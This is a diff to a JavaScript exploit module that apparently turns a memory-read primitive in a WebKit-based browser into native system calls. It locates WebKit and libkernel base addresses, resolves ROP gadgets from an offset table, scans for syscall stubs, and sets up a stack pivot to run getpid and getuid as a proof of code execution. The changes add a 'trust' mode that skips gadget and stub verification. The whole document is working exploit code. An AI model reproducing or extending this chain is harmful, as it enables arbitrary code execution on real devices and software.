@@ -63,32 +63,58 @@ function isStub(v, num) {
     return n === num;
 }
 
-function seedStubs(p, libkernelBase, off) {
+function resolveGadgetsTrust(webkitBase, off) {
+    const G = {};
+    for (let i = 0; i < GADGET_TABLE.length; i++) {
+        const nm = GADGET_TABLE[i][0];
+        const key = GADGET_TABLE[i][1];
+        const rva = off[key];
+        if (rva == null) return { G: null, bad: [nm] };
+        G[nm] = webkitBase.add32(rva);
+    }
+    return { G, bad: [] };
+}
+
+function seedStubs(p, libkernelBase, off, opts) {
+    opts = opts || {};
     const stubAddr = new Map();
     let seeded = 0;
+    const want = [SYS.getpid, SYS.getuid];
     if (off.k_stubs) {
-        for (const numStr in off.k_stubs) {
-            const num = +numStr;
-            const o = off.k_stubs[numStr];
+        for (let wi = 0; wi < want.length; wi++) {
+            const num = want[wi];
+            const o = off.k_stubs[num];
+            if (o == null) continue;
+            if (opts.trustStubs) {
+                stubAddr.set(num, libkernelBase.add32(o));
+                seeded++;
+                continue;
+            }
             const v = p.read8(libkernelBase.add32(o));
             if (!isStub(v, num)) continue;
             stubAddr.set(num, libkernelBase.add32(o));
             seeded++;
         }
     }
-    const need = new Set([SYS.getpid, SYS.getuid].filter(n => !stubAddr.has(n)));
+    const missing = want.filter(n => !stubAddr.has(n));
+    if (missing.length === 0)
+        return { stubAddr, seeded, scanned: 0, missing: [] };
+    if (opts.noStubScan)
+        return { stubAddr, seeded, scanned: 0, missing };
+
     let scanned = 0;
-    const scanMax = off.k_scan_stage1 || 0x40000;
-    for (let o = 0; o < scanMax && need.size; o += 16) {
+    const scanMax = Math.min(off.k_scan_stage1 || 0x40000, opts.stubScanMax || 0x4000);
+    for (let o = 0; o < scanMax && missing.length; o += 16) {
         const v = p.read8(libkernelBase.add32(o));
         if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
         const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
-        if (!need.has(num)) continue;
+        const mi = missing.indexOf(num);
+        if (mi < 0) continue;
         stubAddr.set(num, libkernelBase.add32(o));
-        need.delete(num);
+        missing.splice(mi, 1);
         scanned++;
     }
-    return { stubAddr, seeded, scanned, missing: [...need] };
+    return { stubAddr, seeded, scanned, missing };
 }
 
 function bufAddr(p, off, ab) {
@@ -115,6 +141,7 @@ function put(dv, at, v) {
 export function initNativeCall(p, off, opts) {
     opts = opts || {};
     const log = opts.log || (() => {});
+    const trust = opts.trust !== false;
 
     let webkitBase = opts.webkitBase || null;
     if (!webkitBase && opts.nativeFn && off.wk_expm1_builtin)
@@ -122,19 +149,30 @@ export function initNativeCall(p, off, opts) {
     if (!webkitBase)
         throw new Error("native_call: need webkitBase or nativeFn+expm1");
 
-    if (!off.wk___imp___error || !off.k__error)
-        throw new Error("native_call: missing wk___imp___error / k__error");
-
-    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
-    const libkernelBase = errorFn.sub32(off.k__error);
+    let libkernelBase = opts.libkernelBase || null;
+    if (!libkernelBase) {
+        if (!off.wk___imp___error || !off.k__error)
+            throw new Error("native_call: missing wk___imp___error / k__error");
+        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
+        libkernelBase = errorFn.sub32(off.k__error);
+    }
     log("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
 
-    const { G, bad } = resolveGadgets(p, webkitBase, off);
-    if (bad.length)
-        throw new Error("gadget-bad: " + bad.join(","));
+    const resolved = trust
+        ? resolveGadgetsTrust(webkitBase, off)
+        : resolveGadgets(p, webkitBase, off);
+    const G = resolved.G;
+    if (!G || resolved.bad.length)
+        throw new Error("gadget-bad: " + (resolved.bad || ["?"]).join(","));
 
-    const { stubAddr, seeded, scanned, missing } = seedStubs(p, libkernelBase, off);
-    log("STUBS", "seeded=" + seeded + " scanned=" + scanned);
+    const stubOpts = {
+        trustStubs: trust || opts.trustStubs,
+        noStubScan: trust || opts.noStubScan,
+        stubScanMax: opts.stubScanMax,
+    };
+    const { stubAddr, seeded, scanned, missing } = seedStubs(p, libkernelBase, off, stubOpts);
+    log("STUBS", "seeded=" + seeded + " scanned=" + scanned
+        + (stubOpts.noStubScan ? " (trust)" : ""));
     if (missing.length)
         throw new Error("stub-miss: " + missing.join(","));
 
@@ -158,7 +196,6 @@ export function initNativeCall(p, off, opts) {
             stackU8: new Uint8Array(kb),
             frameU8: new Uint8Array(fb),
         };
-        keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv, c.stackU8, c.frameU8);
         c.S = bufAddr(p, off, sb);
         c.P = bufAddr(p, off, pb);
         c.K = bufAddr(p, off, kb);
@@ -239,13 +276,17 @@ export function initNativeCall(p, off, opts) {
 }
 
 export function runGetpidProof(p, off, opts) {
+    opts = Object.assign({ trust: true, noStubScan: true }, opts || {});
     const chain = initNativeCall(p, off, opts);
     try {
         const pid = chain.sc(SYS.getpid).i32;
-        const uid = chain.sc(SYS.getuid).i32;
-        return { ok: pid > 0, pid, uid, chain };
+        return { ok: pid > 0, pid, uid: null, chain };
     } catch (err) {
         chain.disarm();
         throw err;
     }
+}
+
+export function runGetuidAfterPid(chain) {
+    return chain.sc(SYS.getuid).i32;
 }
